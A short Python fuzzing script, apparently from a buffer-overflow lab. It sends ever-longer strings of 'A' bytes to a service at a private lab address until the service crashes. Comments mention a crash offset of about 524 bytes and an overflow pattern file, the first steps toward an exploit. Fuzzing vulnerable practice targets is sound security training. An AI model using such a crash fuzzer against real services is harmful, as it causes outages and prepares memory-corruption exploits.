''' fuzz.py: send the application increasingly long payloads until it breaks
'''

import sys, socket
host = "192.168.56.103"
port = 9999

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
broken = False
curr_len = 100
try:
    s.connect((host, port))
    s.recv(1024)
    while not broken:
        #junk=b"A"*int(input("> Num of junk bytes to pass?: ")) # 524
        #junk=bytes(open("./overflow_pattern", "r").read(), 'utf-8')
        junk=b"A"*curr_len
        s.sendall(junk)
        print("Sent {} bytes".format(curr_len))
        curr_len += 100
except Exception as e:
    print("Unable to connect "+str(host))
    print(e)
    sys.exit(0)
